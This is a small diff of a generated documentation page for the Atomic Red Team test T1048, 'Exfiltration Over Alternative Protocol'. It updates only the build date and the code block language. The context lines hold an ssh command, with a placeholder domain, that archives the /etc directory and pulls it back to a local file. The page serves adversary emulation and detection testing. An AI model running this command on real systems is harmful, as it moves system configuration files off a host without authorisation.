@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1048"
 attack_technique_name: "Exfiltration Over Alternative Protocol"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048/T1048.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "f6786cc8-beda-4915-a4d6-ac2f193bb988"
@@ -55,7 +55,7 @@ Upon successful execution, sh will spawn ssh contacting a remote domain (default
 
 ### Command
 
-```sh
+```bash
 ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
 ```
 
